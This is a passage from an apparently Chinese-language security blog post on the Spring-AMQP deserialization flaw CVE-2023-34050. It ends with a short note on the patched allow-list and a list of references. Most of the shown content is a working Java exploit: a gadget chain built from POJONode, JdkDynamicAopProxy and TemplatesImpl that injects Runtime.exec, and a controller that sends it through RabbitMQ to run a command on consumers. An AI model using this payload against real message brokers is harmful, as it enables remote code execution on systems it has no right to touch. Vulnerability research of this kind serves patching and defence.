class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(makeTemplatesImplAopProxy(cmd));<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br>        count += <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImpl</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span> + count);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;throw new org.springframework.amqp.AmqpRejectAndDontRequeueException(\&quot;err\&quot;);&#125;&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(makeTemplatesImpl(cmd));<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.producer.controller;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendController</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            ctClass.removeMethod(writeReplace);<br>            ctClass.toClass();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/send&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">send</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;myQueue&quot;</span>, Gadget.getPayload(<span class="hljs-string">&quot;calc&quot;</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231115195356205.png" srcset="/img/loading.gif" lazyload alt="image-20231115195356205"></p>
+<p><img src="/./../img/image-20231115195440766.png" srcset="/img/loading.gif" lazyload alt="image-20231115195440766"></p>
+<p>消费者若读取Message出现异常，RabbitMQ会将其重新排队，导致客户端陷入无限循环</p>
+<p>payload中要抛出<code>AmqpRejectAndDontRequeueException</code>异常。</p>
+<h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p>新版本<code>SerializationUtils </code>增加了几个成员变量，改了<code>checkAllowedList</code>，默认情况下不能反序列化任意类了。想要反序列化要么得配置<code>allowedList</code>，要么得开启环境变量<code>SPRING_AMQP_DESERIALIZATION_TRUST_ALL</code>，或设置系统属性<code>spring.amqp.deserialization.trust.all</code></p>
+<p><img src="/./../img/image-20231115202205838.png" srcset="/img/loading.gif" lazyload alt="image-20231115202205838"></p>
+<p><img src="/./../img/image-20231115202326118.png" srcset="/img/loading.gif" lazyload alt="image-20231115202326118"></p>
+<h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/769883">https://developer.aliyun.com/article/769883</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1252599548343744/1282385960239138">https://www.liaoxuefeng.com/wiki/1252599548343744/1282385960239138</a></li>
+<li><a target="_blank" rel="noopener" href="https://exp10it.cn/2023/10/spring-amqp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2023-34050-%E5%88%86%E6%9E%90/">https://exp10it.cn/2023/10/spring-amqp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2023-34050-%E5%88%86%E6%9E%90/</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+        <a href="/tags/java/" class="print-no-link">#java</a>
+      
+        <a href="/tags/middleware/" class="print-no-link">#middleware</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Spring-AMQP CVE-2023-34050</div>
+      <div>http://example.com/2023/11/10/amqp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/12/HuaWeiCup/" title="华为杯ADWP赛后复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">华为杯ADWP赛后复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/10/kafka/" title="Spring-Kafka CVE-2023-34040">
+                        <span class="hidden-mobile">Spring-Kafka CVE-2023-34040</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
